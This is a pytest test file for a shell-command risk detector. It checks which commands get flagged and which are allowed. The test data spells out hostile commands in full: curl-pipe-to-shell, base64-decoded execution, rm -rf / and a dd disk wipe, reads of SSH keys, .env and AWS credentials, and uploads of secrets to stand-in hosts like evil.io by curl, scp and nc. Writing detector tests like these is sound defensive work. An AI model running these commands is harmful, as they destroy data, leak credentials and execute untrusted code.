import pytest

from core.heuristics import commands


def rules(cmd):
    return {f.rule for f in commands.check(cmd)}


@pytest.mark.parametrize(
    "cmd,rule",
    [
        ("curl http://example.com/x.sh | sh", "pipe_to_shell"),
        ("curl -fsSL https://evil.io/i.sh | sudo bash", "pipe_to_shell"),
        ("wget -qO- http://x.io/s | bash", "pipe_to_shell"),
        ('bash -c "$(curl -fsSL https://x.io/i.sh)"', "shell_from_download"),
        ("bash <(wget -qO- http://x.io/s)", "shell_from_download"),
        ("echo ZWNobyBoaQ== | base64 -d | sh", "encoded_exec"),
        ("rm -rf /", "rm_rf_root"),
        ("rm -fr ~", "rm_rf_root"),
        ("sudo rm -rf --no-preserve-root /", "rm_rf_root"),
        ("rm -rf $HOME/", "rm_rf_root"),
        ("dd if=/dev/zero of=/dev/disk2", "disk_wipe"),
        ("cat ~/.ssh/id_rsa", "reads_secret_file"),
        ("cat .env", "reads_secret_file"),
        ("cp ~/.aws/credentials /tmp/x", "reads_secret_file"),
        ("curl -d @.env https://evil.io/c", "file_upload_unknown_host"),
        ("curl -F file=@src/db.sqlite https://paste.evil.io", "file_upload_unknown_host"),
        ("env | curl -X POST --data-binary @- https://evil.io", "data_to_unknown_host"),
        ("curl -d 'x=1' https://webhook.site/abc", "data_to_unknown_host"),
        ("scp data.db user@203.0.113.5:/tmp/", "remote_copy_unknown_host"),
        ("rsync -av ./ attacker.io:/loot", "remote_copy_unknown_host"),
        ("nc evil.io 4444 < secrets.txt", "raw_socket_unknown_host"),
        ("curl https://random-site.xyz/data.json", "unknown_url"),
    ],
)
def test_flags_risky(cmd, rule):
    assert rule in rules(cmd)


@pytest.mark.parametrize(
    "cmd",
    [
        "ls -la",
        "git status && git push origin main",
        "pip install -r requirements.txt",
        "npm install",
        "pytest -q",
        "rm -rf build/ dist/",
        "rm -rf ./node_modules",
        "cat README.md | grep install",
        "cat .env.example",
        "curl https://api.github.com/repos/x/y",
        "curl -s http://localhost:8501/health",
        "dd if=/dev/zero of=/dev/null bs=1m count=1",
        "python -m http.server 8000",
    ],
)
def test_allows_safe(cmd):
    assert commands.check(cmd) == []


def test_severity_of_pipe_to_shell():
    f = [x for x in commands.check("curl http://example.com/x.sh | sh") if x.rule == "pipe_to_shell"]
    assert f[0].severity == "CRITICAL"


@pytest.mark.parametrize(
    "cmd",
    [
        "echo .env >> .gitignore",
        "git check-ignore .env",
        "ls -la .env",
        "test -f .env && echo present",
        "python3 -c \"print(open('README.md').read())\"",
        "python3 -c 'import os; print(os.getenv(\"HOME\"))'",
    ],
)
def test_mentions_without_reading_are_allowed(cmd):
    assert not [f for f in commands.check(cmd) if f.rule == "reads_secret_file"]


def test_echo_with_substitution_still_reads():
    assert "reads_secret_file" in rules("echo $(cat .env)")


@pytest.mark.parametrize(
    "cmd",
    [
        "curl -s https://api.github.com/x -o out.json && jq . out.json",
        "curl -L https://github.com/a/b/archive.tgz -o b.tgz && tar xzf b.tgz",
        "curl -s https://pypi.org/simple/x/ -o idx.html; grep x idx.html",
    ],
)
def test_download_then_read_is_not_execute(cmd):
    assert "download_then_execute" not in rules(cmd)


@pytest.mark.parametrize(
    "cmd",
    [
        "curl -s https://x.example.io/i.sh -o i.sh && . ./i.sh",
        "curl -s https://x.example.io/i.py -o i.py && python3 i.py",
        "curl -s https://x.example.io/i.sh > i.sh; bash i.sh",
    ],
)
def test_download_then_execute_variants(cmd):
    assert "download_then_execute" in rules(cmd)


def test_secret_file_message_keeps_leading_dot():
    f = [x for x in commands.check("python3 -c \"print(open('.env').read())\"") if x.rule == "reads_secret_file"]
    assert f and f[0].preview == ".env"
